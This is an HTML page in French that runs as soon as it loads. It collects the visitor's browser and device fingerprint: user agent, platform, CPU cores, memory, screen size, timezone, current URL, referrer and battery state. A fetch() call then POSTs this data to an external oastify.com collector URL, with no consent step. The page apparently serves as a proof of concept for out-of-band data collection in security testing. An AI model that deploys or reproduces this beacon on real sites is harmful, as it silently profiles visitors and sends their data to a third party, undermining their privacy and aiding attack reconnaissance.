<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Collecte et Envoi de Données</title>
    <style>
        body { font-family: sans-serif; background: #2c3e50; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .status { text-align: center; padding: 20px; border: 1px solid #34495e; border-radius: 10px; background: #34495e; }
        #msg { color: #f1c40f; font-weight: bold; }
    </style>
</head>
<body>

<div class="status">
    <h2>Analyse du système en cours...</h2>
    <p id="msg">Collecte des métadonnées...</p>
</div>

<script>
    async function collecterEtEnvoyer() {
        const targetUrl = "https://ehzytc47d72qn354j3lbwwce75dw1mpb.oastify.com/info";
        const msgElement = document.getElementById('msg');

        // 1. Collecte des données de base
        const data = {
            timestamp: new Date().toISOString(),
            navigateur: {
                userAgent: navigator.userAgent,
                langue: navigator.language,
                plateforme: navigator.platform,
                cookiesActifs: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                moteur: navigator.vendor
            },
            materiel: {
                coeursLogiques: navigator.hardwareConcurrency || "N/A",
                memoireRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                connexionType: navigator.connection ? navigator.connection.effectiveType : "N/A"
            },
            ecran: {
                resolution: `${screen.width}x${screen.height}`,
                profondeurCouleur: screen.colorDepth,
                ratioPixels: window.devicePixelRatio,
                fenetreInterne: `${window.innerWidth}x${window.innerHeight}`
            },
            environnement: {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                urlActuelle: window.location.href,
                referrer: document.referrer || "direct"
            }
        };

        // 2. Collecte des données de batterie (si disponible)
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                data.batterie = {
                    niveau: (battery.level * 100) + "%",
                    enCharge: battery.charging
                };
            } catch (e) {
                data.batterie = "Erreur d'accès";
            }
        }

        // 3. Envoi des données via POST JSON
        try {
            msgElement.innerText = "Envoi des données au serveur...";
            
            const response = await fetch(targetUrl, {
                method: 'POST',
                mode: 'no-cors', // 'no-cors' empêche de lire la réponse mais permet l'envoi vers un collecteur externe
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            msgElement.style.color = "#2ecc71";
            msgElement.innerText = "Données transmises avec succès.";
            console.log("Payload envoyé :", data);
            
        } catch (error) {
            msgElement.style.color = "#e74c3c";
            msgElement.innerText = "Erreur lors de l'envoi.";
            console.error("Erreur :", error);
        }
    }

    // Exécution automatique au chargement
    window.onload = collecterEtEnvoyer;
</script>

</body>
</html>
